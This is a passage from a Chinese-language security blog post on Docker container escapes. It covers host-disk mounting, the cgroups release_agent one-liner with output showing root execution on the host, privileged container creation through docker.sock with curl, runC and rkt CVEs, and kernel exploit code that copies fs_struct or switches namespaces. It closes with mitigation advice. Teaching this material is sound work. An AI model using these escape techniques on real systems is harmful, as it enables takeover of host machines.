'hello, host' \u003e /hello\n```\n\n先在 Container 內創立一個檔案：\n\n```\n$ docker inspect e937 | grep Upper\n                \"UpperDir\": \"/var/lib/docker/overlay2/657597a...a966/diff\",\n$ sudo cat /var/lib/docker/overlay2/657597a...a966/diff/hello\nhello, host\n```\n\n然後用 `docker inspect` 找到 UpperDir，就會看到我們建立的 `hello` 檔案了！\n\n\u003cbr/\u003e\n\n## Container Escape\n來試想一個情境，有一台主機遵守 Microservices 的精神，使用 Docker 分別架設了網站、資料庫與郵件伺服器這三個 Container，假設郵件伺服器存在漏洞被駭客入侵，也不會直接影響到網站和資料庫，維護的工程師也能很快的用 Docker 換成新版本來進行即時修補。但如果 Container 存在漏洞時，所有的服務都有可能陷入風險。\n\n### Privileged Container\n我們先從比較容易 Escape 的 Privileged Container 開始，Privileged Container 沒有 Seccomp 限制且 Capability 全開，讓 Container 可以存取所有硬體設備，為的就是讓這個 Container 有獨立的環境且能做 Host 能做的事。Docker 建立 Privileged container 的方法很簡單，只要在 `dokcer run` 時多加個 `--privileged` flag 即可。\n\n`docker run --privileged -it ubuntu`\n\n另外還有一個很棒的功能，用 Docker 跑 Docker。聽起來很奇怪但很合理，如果去看 Docker 的[開發文件](https://github.com/docker/docker-ce/blob/master/components/engine/docs/contributing/set-up-dev-env.md)，會發現 Docker 是用 Docker 開發的。\n\n一般來說開發用的 Privileged container 駭客碰不到，但如果是用 Docker 架設 CI/CD 工具，然後使用這些工具的 Docker 功能呢？歡迎參考[這篇](https://www.slideshare.net/Docker/build-publish-deploy-and-test-docker-images-and-containers-with-jenkins-workflow)的 \"How Can You Use Jenkins \u0026 Docker Together\"。\n\n沒錯，你需要一個 Privileged container 來運行 CI/CD 工具！接下來先以 Privileged container 為例，說明在我們打下有漏洞的 CI/CD 工具且有 `root` 權限後，要怎麼控制 Host。\n\n#### Mount root\n第一個要介紹的是這個一直被針對的 `mount` ，在 Privileged container 裡是可以直接使用的，來看看如何透過它存取 Host 檔案。\n\n首先先取得 Block device 的 Major 與 Minor：\n\n```\nroot@997453a4062f:/test# ls -alF /sys/dev/block/ | grep sda1\nlrwxrwxrwx 1 root root 0 Aug 12 06:50 8:1 -\u003e ../../devices/pci0000:00/0000:00:01.1/ata1/host0/target0:0:0/0:0:0:0/block/sda/sda1/\n```\n\n`sda1` 是 Host 的根目錄（不同的電腦可能不一樣，對駭客來說可以全部都試試看）。接下來用 `mknod` 產 Block special file 然後 `mount`，就會把 Host 的根目錄放在 Container 內了（若 `/dev/sda1` 不存在才需要使用 `mknod`）。\n\nDocker:\n\n```\nroot@997453a4062f:/test# mknod /dev/myroot b 8 1\nroot@997453a4062f:/test# mkdir rootfs; mount /dev/myroot rootfs\nroot@997453a4062f:/test# echo hello, host! \u003e rootfs/hello\n```\n\nHost:\n\n```\nroot@escape:/# cat /hello\nhello, host!\n```\n\n#### Cgroups v1 release notification\n\n只能存取 `root` 資料夾還不夠！我們的目標是能在 Host 上做任何事且不受 Container 影響。接下來要介紹的是 [Felix Wilhelm 在 Twitter 上寫的](https://twitter.com/_fel1x/status/1151487051986087936)：\n\n\u003e Quick and dirty way to get out of a privileged k8s pod or docker container by using cgroups release_agent feature.\n\n```\nd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nmkdir -p $d/w;echo 1 \u003e$d/w/notify_on_release\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\ntouch /o; echo $t/c \u003e$d/release_agent;echo \"#!/bin/sh\n$1 \u003e$t/o\" \u003e/c;chmod +x /c;sh -c \"echo 0 \u003e$d/w/cgroup.procs\";sleep 1;cat /o\n```\n\n直接用 Docker 跑跑看：\n\n```\n$ docker run --privileged -it ubuntu\nroot@acf8f56c9de6:/test# cat \u003e exp.sh\nd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nmkdir -p $d/w;echo 1 \u003e$d/w/notify_on_release\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\ntouch /o; echo $t/c \u003e$d/release_agent;echo \"#!/bin/sh\n$1 \u003e$t/o\" \u003e/c;chmod +x /c;sh -c \"echo 0 \u003e$d/w/cgroup.procs\";sleep 1;cat /o\nroot@acf8f56c9de6:/test# chmod +x ./exp.sh\nroot@acf8f56c9de6:/test# ./exp.sh ps\n  PID TTY          TIME CMD\n    1 ?        00:01:31 systemd\n    2 ?        00:00:00 kthreadd\n    3 ?        00:00:00 rcu_gp\n    4 ?        00:00:00 rcu_par_gp\n    6 ?        00:00:00 kworker/0:0H-kb\n    9 ?        00:00:00 mm_percpu_wq\n   10 ?        00:00:15 ksoftirqd/0\n   11 ?        00:09:23 rcu_sched\n   12 ?        00:00:02 migration/0\n   13 ?        00:00:00 idle_inject/0\n   14 ?        00:00:00 cpuhp/0\n   15 ?        00:00:00 cpuhp/1\n   16 ?        00:00:00 idle_inject/1\n   17 ?        00:00:03 migration/1\n   18 ?        00:00:05 ksoftirqd/1\n   20 ?        00:00:00 kworker/1:0H-ev\n   ...\nroot@acf8f56c9de6:/test# ./exp.sh id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n太棒了！可以在 Container 外執行任意指令且是 `root` 權限。接下來分析它怎麼做到的：\n\n```\nroot@acf8f56c9de6:/test# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nroot@acf8f56c9de6:/test# echo $d\n/sys/fs/cgroup/rdma\n```\n\n`d` 變數的目的是取得 Cgroups 底下有 `release_agent` 檔案的路徑，`release_agent` 的描述可參考 [Man page](https://man7.org/linux/man-pages/man7/cgroups.7.html)：\n\n\u003e A special file in the root directory of each cgroup hierarchy, release_agent, can be used to register the pathname of a program that may be invoked when a cgroup in the hierarchy becomes empty.\n\n變為空的意思：\n\n\u003e A cgroup is considered to be empty when it contains no child cgroups and no member processes.\n\n`release_agent` 一般用來讓使用者自訂腳本，清理新建的 Cgroups 讓 `cgroupfs` 保持乾淨，而它會在 Host 以 `root` 權限執行，所以只要能控制 `release_agent`，我們就可以在 Container 外執行任意指令。\n\n在 Cgroups 資料夾底下創立一個 `w` 資料夾，會讓 Cgroups 創立一個新的群組，然後啟用這個群組的 `notify_on_release`：\n\n```\nmkdir -p $d/w;echo 1 \u003e$d/w/notify_on_release\n```\n\n`t` 變數是找出 Host 可以直接看到 Container 檔案的路徑，也就是 OverlayFS 的 UpperDir (Container layer) ，以便 `release_agent` 能夠呼叫 Container 內的惡意腳本：\n\n```\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\n```\n\n最後一步把 `release_agent` 指到我們能控制的惡意腳本，然後利用 `echo 0 \u003e $d/w/cgroup.procs` 把 `echo` 加入 `w` 這個 Cgroups，待 `echo` 結束後就會觸發 `notify_on_release` 然後呼叫 `release_agent`：\n\n```\ntouch /o; echo $t/c \u003e$d/release_agent;echo \"#!/bin/sh\n$1 \u003e$t/o\" \u003e/c;chmod +x /c;sh -c \"echo 0 \u003e$d/w/cgroup.procs\";sleep 1;cat /o\n```\n\n可以發現我們主要用到的功能是 Cgroups 以及 `mount`，因此這個利用方式有個修訂版本，只要使用 `docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash` 就可以利用較少的權限 Escape，詳細可以看[這篇文章](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)。\n\n\u003ciframe src=\"https://asciinema.org/a/356357/embed?\" id=\"asciicast-iframe-356357\" name=\"asciicast-iframe-356357\" scrolling=\"no\" allowfullscreen=\"true\" style=\"overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 100%; float: none; visibility: visible; height: 468px;\"\u003e\u003c/iframe\u003e\n\n#### Exposed docker.sock\n\n用 Docker 跑 Docker 的方式還有這個：\n\n```\ndocker run -v /var/run/docker.sock:/var/run/docker.sock\n```\n\n`dockerd` 開啟後預設會在 `/var/run/docker.sock` 聽取命令，等待使用者送出 Docker 指令後，`docker-cli` 會把指令轉成一定的格式跟 `docker.sock` 溝通，所以把這個檔案映射到 Container 內，等同於讓這個 Container 能夠用 Host 的名義建立 Container。\n\n我們可以簡單的使用 `curl` 控制 `docker.sock`：\n\n```\n$ curl -XPOST --unix-socket /var/run/docker.sock -d '{\"Image\":\"ubuntu\", \"Privileged\":true}' -H 'Content-Type: application/json' http://localhost/containers/create\n{\"Id\":\"8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a\",\"Warnings\":[]}\n$ curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a/start\n```\n\n只要對 `docker.sock` 發送請求就能創立一個 Container！可以用上面的方法開啟一個 Privileged container，再利用前面的手法拿到 Host 控制權！\n\n\u003cbr/\u003e\n\n### Container Engine bug\n\n不過一般的服務如郵件伺服器，它不需要用 Docker 跑 Docker 的功能，也就不會以 `--privileged` 的方式運行，所以就算利用漏洞拿到 Container 的 `root` 權限，也不能用 `mount` 或 `docker.sock` 的方式 Escape，但如果 Container Engine 本身有漏洞，就有機會利用它控制 Host。\n\n#### runC CVE-2019-5736\n\n第一個要介紹的是 runC (run container)，它是一個根據 OCI 規範用來運行 Container 的程式，被許多 Container engine 呼叫，例如：Docker、Kubernets、LXC 等，因此這個漏洞影響範圍相當大（[詳細受影響清單](https://www.cvedetails.com/cve/CVE-2019-5736/)）。而攻擊條件是駭客在 Container 內有 `root` 權限，或 Container Engine 執行了惡意的 Container。\n\n它的漏洞原因在於，新的 Process 若是 `/proc/self/exe`，就能利用殘留的 File descriptor 改寫 runC 這隻程式，等到下次有人使用 Docker 時就會執行被改寫的 runC，而 Docker 是用 `root` 權限運行的，因此就獲得了 `root` 的任意命令執行！\n\n先來看 Process 在正常狀況下是如何被放進 Container。在執行 `docker exec` 的時候 runC 會把自己放進 Container 的 Namespace 然後再 `execve(\"binary\")`：\n\n![Blog_9-6](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-6_2c8cdf52db.png)\n\n但 Process 若指定成 `/proc/self/exe` 就會指回 runC 本身：\n\n![Blog_9-7](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544713/Blog_9-7_011278ad04.png)\n\n有趣的事情發生了！runC 執行 `execve(\"/proc/self/exe\")`，也就是再跑了一次 runC，但用的 Library 是 Container 內的 Library，所以我們可以改寫 Container 內的 `libc` 或 `libseccomp` 之類的 runC 會用到的 Dynamic library，執行任意的程式碼！\n\n![Blog_9-8](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-8_2620f0f070.png)\n\n有任意程式碼執行後重複開啟 `/proc/self/exe`，就能存取 Host 的 runC 程式，但在 Linux 裡執行中的程式是不能被修改的，所以先用 `open` 的 `O_PATH` 模式留下 File descriptor，但不開啟檔案然後 `fork` 讓子程序對 runC 寫入惡意指令，接下來只要等待下一次的 `docker exec` 就會觸發惡意指令！\n\n![Blog_9-9](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-9_fb31bbc0f3.png)\n\n這個漏洞是 CTF 隊伍 Dragon Sector 打完比賽後獲得靈感而研究出來的漏洞，詳細的挖掘過程在他們的[部落格](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)，以及他們的 [Exploit Code](https://www.openwall.com/lists/oss-security/2019/02/13/3)。\n\n\u003ciframe src=\"https://asciinema.org/a/356360/embed?\" id=\"asciicast-iframe-356360\" name=\"asciicast-iframe-356360\" scrolling=\"no\" allowfullscreen=\"true\" style=\"overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 100%; float: none; visibility: visible; height: 468px;\"\u003e\u003c/iframe\u003e\n\n\u003cbr/\u003e\n\n#### rkt CVE-2019-10144/CVE-2019-10145/CVE-2019-10147\n\nrkt 也是一個 Container engine，但已經沒有在維護了，所以這三個 CVE 到現在還是可以利用，不過利用條件較為嚴苛，駭客需要控制由 `rkt enter` 開啟的 Process 才能 Escape（一般狀況下會以 `rkt run` 的方式開啟）。\n\n`rkt enter` 就像是 `docker exec`，可以在指定的 Container 內執行程式，但使用 `rkt enter` 執行的程式擁有所有的 Capabilities ，沒有 Seccomp 限制也沒有隔離 Cgroups。就像個 Privileged Container！\n\n所以使用 `getpcaps $$` 看到所有 Capabilities 的話，恭喜你，你處在一個可以 Container Escape 的環境內！\n\n來看看利用方法，首先下載最新版的 rkt：\n\n```\nwget https://github.com/rkt/rkt/releases/download/v1.30.0/rkt-v1.30.0.tar.gz\ntar xzvf rkt-v1.30.0.tar.gz\ncd rkt-v1.30.0\n./rkt help\n```\n\n用 `getpcaps` 檢查看看：\n\n```\n$ sudo ./rkt --insecure-options=image --interactive=true  run docker://libpcap/libpcap\nroot@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$\nCapabilities for `6': = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep\n```\n\n```\n$ sudo ./rkt enter 9354 /bin/bash\nroot@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$\nCapabilities for `14': = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_rｆaw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep\n```\n\n使用 `rkt enter` 開啟的 `bash` 有 `cap_sys_admin`，可以試著用之前說到的 `mount` 方法存取 Host 的檔案！\n\n但這裡會遇到一些問題，`mknod` 出來的 Block special file 放的位置會影響能不能 `mount`，所以這邊用一個改良的做法：\n\n```\n# mkdir mydev\n# mkdir rootfs\n# mount -t devtmpfs none mydev\n# mount mydev/sda1 rootfs\n```\n\n直接 `mount` 一個型態為 devtmpfs 的資料夾， Linux kernel 就會自動把所有的 Device file 準備好，我們只要 `mount mydev/sda1` 就能存取 Host 的根目錄！\n\n\u003cbr/\u003e\n\n### Linux kernel exploit\n\n前面講到的 Privileged container 以及 Container Engine bug 需要在 Container 內有 `root` 權限，但並不是每個服務都是以 `root` 權限運行，例如 HTTP server 通常會以較低權限的使用者如 `www-data` 身份執行，聰明的你一定注意到了，利用 Linux kernel exploit 獲得 `root` 權限然後再 Escape！\n\n其實，有 Linux kernel exploit 的話可以直接 Escape！Container 用到的 Namespaces、Cgroups 等都是由 Linux kernel 提供的功能，所以如果在 Kernel space 內改寫相關結構，再跳回 User space，就能控制 Host，而且也不需要 Container 的漏洞！\n\n讓我們看看 Linux kernel 內管理 Process 的結構 [`task_struct`](https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L818)\n\n```clike=\nstruct task_struct {\n\t/* ... */\n\t/*\n\t * Pointers to the (original) parent process, youngest child, younger sibling,\n\t * older sibling, respectively.  (p-\u003efather can be replaced with\n\t * p-\u003ereal_parent-\u003epid)\n\t */\n\t\n\t/* Real parent process: */\n\tstruct task_struct __rcu\t*real_parent;\n\t\n\t/* Recipient of SIGCHLD, wait4() reports: */\n\tstruct task_struct __rcu\t*parent;\n\t/* ... */\n\t/* Filesystem information: */\n\tstruct fs_struct\t\t*fs;\n\t/* ... */\n}\n```\n\n裡面有一個 [`fs_struct`](https://elixir.bootlin.com/linux/latest/source/include/linux/fs_struct.h#L9)，再往裡面看看：\n\n```clike=\nstruct fs_struct {\n\tint users;\n\tspinlock_t lock;\n\tseqcount_t seq;\n\tint umask;\n\tint in_exec;\n\tstruct path root, pwd;\n} __randomize_layout;\n```\n\n`task_struct-\u003efs` 存放著這個 Process 的 `root` 以及工作目錄，而我們能夠用 `task_struct-\u003ereal_parent` 取得 Parent process 的 `task_struct`，所以我們可以不斷的往上找，直到找到 `PID = 1`，也就是位於 Host 的 Init process，然後把它的 `fs_struct` 複製給自己，就可以存取 Host 的根目錄了！\n\n![Blog_9-12](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-12_97ea7b5407.png)\n\n這個 Exploit 取自 Nick Freeman 的文章  [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)，他修改了由 Andrey Konovalov 寫的 Linux Kernel exploit，讓它可以 Escape container：\n\n```clike=\ntypedef unsigned long __attribute__((regparm(3))) (*_copy_fs_struct)(unsigned long init_task);\n\nuint64_t get_task(void) {\n    uint64_t task;\n    asm volatile (\"movq %%gs: 0xD380, %0\":\"=r\"(task));\n    return task;\n}\n\nvoid get_root(void) {\n\n    int i;\n    char *task;\n    char *init;\n    uint32_t pid = 0;\n\n\n\t((_commit_creds)(COMMIT_CREDS))(\n\t    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));\n\n\n    task = (char *)get_task();\n    init = task;\n    while (pid != 1) {\n        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);\n        pid = *(uint32_t *)(init + TASK_PID_OFFSET);\n    }\n\n  \n    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));\n}\n```\n\n每個 Linux kernel exploit 都會有一行：\n\n```\n\t((_commit_creds)(COMMIT_CREDS))(\n\t    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));\n```\n\n用途是建立擁有所有權限的 Credentials 並使用它，也就是讓這個 Process 變成 `root` 權限。而這個 Exploit 就是在它之後加上：\n\n```clike\n    task = (char *)get_task();\n    init = task;\n    while (pid != 1) {\n        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);\n        pid = *(uint32_t *)(init + TASK_PID_OFFSET);\n    }\n\n  \n    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));\n```\n\n用 `while` 迴圈找到 Init process，然後呼叫 `copy_fs_struct` 把 `fs_struct` 複製回來，就能看到 Host 的根目錄。\n\n\u003ciframe src=\"https://asciinema.org/a/356361/embed?\" id=\"asciicast-iframe-356361\" name=\"asciicast-iframe-356361\" scrolling=\"no\" allowfullscreen=\"true\" style=\"overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 100%; float: none; visibility: visible; height: 468px;\"\u003e\u003c/iframe\u003e\n\n但還沒結束！我們實際上還沒繞過 Namespaces 的限制，如果使用 `kill` 是會失敗的：\n\n```\nubuntu@ubuntu:/$ ./poc\n[^] starting\n[=] running KASLR defeat exploit (CVE-2017-18344)\n[0] enumerating divide_error() location (CVE-2017-18344)\n[\u003e] setting up proc reader\n...\n[+] done, should be root now\n[6] checking if we got root\n[+] got r00t ^_^\nroot@ubuntu:/# ps aux | grep cat\nuser     22522  0.0  0.0   7444   680 pts/1    S+   17:34   0:00 cat\nroot     22547  0.0  0.0  11288   924 pts/3    S+   17:35   0:00 grep --color=auto cat\nroot@ubuntu:/# kill 22522\nbash: kill: (22522) - No such process\n```\n\n但也足夠了，可以用 Docker 執行 Privileged container 再 Escape。或是 Nick Freeman 提供的作法：\n\n\u003e * Write or overwrite host or other container files (including kubelet configs)\n\u003e * Interact with Docker (perhaps pull and launch a new fun privileged container)\n\u003e * Inject code or harvest data from processes (host or container) via /proc/pid/mem\n\u003e * Load/ unload kernel modules\n\n\u003cbr/\u003e\n\n這麼一來就可以不用花費力氣在換 Namespaces 上，但也有一篇文章提到更換 Namespaces 的方法 [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)：\n\n```clike=\nvoid get_root_payload( void) {\n\n        ((_commit_creds)(COMMIT_CREDS))(\n                ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0)\n        );\n\n        // -------- NAMESPACE DOCKER EXPLOIT  --------\n        // copy nsproxy from init_nsproxy to pid 1 of the container\n        unsigned long long g = ((_find_task_vpid)(FIND_TASK))(1);\n\n        // now, do the magic.... !!!! Simple black magic doesn't work on current process!!!!\n        ((_switch_task_namespaces)(SWITCH_TASK_NS))(( void *)g, (void *)INIT_NSPROXY);\n\n        // prepare the two namespace FDs by opening the respective files\n        long fd = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, \"/proc/1/ns/mnt\", O_RDONLY, 0);\n        ((_sys_setns)(SYS_SETNS))( fd, 0);\n\n        fd      = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, \"/proc/1/ns/pid\", O_RDONLY, 0);\n        ((_sys_setns)(SYS_SETNS))( fd, 0);\n}\n```\n\n這篇的作法是開啟 `/proc/1/ns/` 資料夾下的檔案，也就是 Namesapces 提供的各個部件（這邊選擇 `mnt` 與 `pid`），然後呼叫 `setns` 把自己的 Namespaces 設定成跟 Host 一樣，這樣就不用額外的步驟，可以直接存取 Host！\n\n\u003cbr/\u003e\n\n## Mitigation\n\n上述說到的 Privileged container 是最容易 Escape 的 Container ，若一定得使用它開服務的話，要把它當作 Host 的服務看待，做好權限管理，只要駭客沒有足夠的權限（ `root` ），就不能使用 `mount` 的方式存取 Host 資源，大幅降低它所造成的危害。Docker 可以用 `docker run -u {uid}:{gid}`，以較低的使用者權限開啟 Container，然後把要開啟的服務放在一般使用者可用的 `port \u003e= 1024` 上，這麼一來就算駭客打下服務，也沒有足夠的權限使用 `mount` 做進一步的攻擊：\n\n```\n# docker run --privileged -it -u 1000 python bash\nI have no name!@6b6f0f0bc93d:/$ python -m http.server 8080 \u0026\n[1] 7\nI have no name!@6b6f0f0bc93d:/$ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n\nI have no name!@6b6f0f0bc93d:/$ ps aux\nUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n1000         1  0.1  0.0   5748  3632 pts/0    Ss   02:51   0:00 bash\n1000         7  4.0  0.1  25996 18840 pts/0    S    02:51   0:00 python -m http.server 8080\n1000         8  0.0  0.0   9388  3100 pts/0    R+   02:51   0:00 ps aux\nI have no name!@6b6f0f0bc93d:/$ mkdir /tmp/t1; mkdir /tmp/t2; mount --bind /tmp/t1 /tmp/t2\nmount: only root can use \"--bind\" option\n```\n\n也可以善用 `setuid`，切換到權限較低的使用者。剩下的就是定期更新、檢查使用的產品是否出現漏洞，以及避免使用不再維護的產品。\n\n\u003cbr/\u003e\n\n## Container security is Linux security\n\nContainer 仰賴 Linux kernel 提供的機制，隔離出一塊空間供 Container 使用，所以當這些機制出現問題或開發者設計時沒有考慮周全，原以為安全的 Container 就有可能被駭客利用，造成更大的危害。今天分別介紹 Privileged Container、Container Engine bug 以及 Linux kernel exploit 這三種攻擊情境，都是利用 Linux 本身的特性達到存取 Host 資源的效果。希望你們會喜歡，也祝各位都能成功 Escape！\n\n\u003cbr/\u003e\n\n## References\n\n* [Breaking Out of rkt – 3 New Unpatched CVEs](https://unit42.paloaltonetworks.com/breaking-out-of-coresos-rkt-3-new-cves/)\n* [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)\n* [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)\n* [CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)\n* [A Compendium of Container Escapes](https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf)\n* [Linux Container Escapes and Hardening](https://gist.github.com/FrankSpierings/5c79523ba693aaa38bc963083f48456c)\n* [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)\n\n\u003cbr/\u003e","createdAt":"2020-09-08T07:57:40.695Z","updatedAt":"2020-09-16T03:14:35.146Z","__v":0,"id":"5f573974531f77004b1a31ff"}],"createdAt":"2020-09-08T07:57:40.608Z","updatedAt":"2021-01-27T04:41:08.603Z","__v":1,"author":{"confirmed":true,"blocked":false,"_id":"5eeadf2c163518003f86d911","username":"D39","email":"d39@example.com","provider":"local","createdAt":"2020-06-18T03:27:40.091Z","updatedAt":"2020-06-19T03:40:27.965Z","__v":0,"role":"5e467d0375f9d7007998aebf","id":"5eeadf2c163518003f86d911"},"topic":{"category":"blogs","_id":"5ecaa004a792d70040a0d8b0","color":"#64cda2","name":"Technical Analysis","createdAt":"2020-05-24T16:25:40.461Z","updatedAt":"2020-06-07T22:08:04.525Z","__v":0,"contents":[{"locale":"en","_id":"5edd6544bf58af004a15410d","text":"Technical Analysis","createdAt":"2020-06-07T22:08:04.247Z","updatedAt":"2020-06-07T22:08:04.247Z","__v":0,"id":"5edd6544bf58af004a15410d"},{"locale":"tw","_id":"5edd6544bf58af004a15410e","text":"技術分析","createdAt":"2020-06-07T22:08:04.247Z","updatedAt":"2020-06-07T22:08:04.247Z","__v":0,"id":"5edd6544bf58af004a15410e"},{"locale":"jp","_id":"5edd6544bf58af004a15410f","text":"技術分析","createdAt":"2020-06-07T22:08:04.248Z","updatedAt":"2020-06-07T22:08:04.248Z","__v":0,"id":"5edd6544bf58af004a15410f"}],"id":"5ecaa004a792d70040a0d8b0"},"banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1599804537/emergency-exit-1321134_1920_6420b1abb7.jpg","been_relative_posts":[],"id":"5f573974531f77004b1a31fe"}},"__N_SSG":true},"page":"/[lang]/posts/[uid]","query":{"lang":"tw","uid":"container-escape-101"},"buildId":"yZH7uzr0jnSd-VRHt_pM1","runtimeConfig":{"env":"production","baseUrl":"https://teamt5.org/","cmsUrl":"https://official-cms.teamt5.net/"},"isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html></html>